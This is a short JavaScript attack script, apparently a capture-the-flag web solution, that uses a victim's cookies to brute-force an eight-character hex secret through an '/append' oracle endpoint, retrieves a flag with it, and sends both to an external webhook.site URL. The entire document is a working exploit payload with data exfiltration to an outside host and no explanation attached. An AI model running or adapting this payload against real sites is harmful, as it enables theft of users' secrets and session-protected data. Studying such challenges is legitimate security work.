(async () => {
  const hex = "0123456789abcdef";
  let s = "";

  async function ok(c) {
    const r = await fetch("/append?content=" + c + "&url=" + location.origin + "/", {
      credentials: "include",
      cache: "no-store",
    });
    return r.status === 200;
  }

  for (let i = 0; i < 8; i++) {
    for (const h of hex) {
      if (await ok(s + h)) { s += h; break; }
    }
  }

  const flag = await (await fetch("/flag?secret=" + s, { credentials: "include" })).text();
  const body = "s=" + s + "&f=" + flag;
  fetch("https://webhook.site/6c3d9ad5-b116-4007-a50d-aac384062d0d", {
    method: "POST",
    mode: "no-cors",
    headers: { "content-type": "text/plain" },
    body,
  });
})()
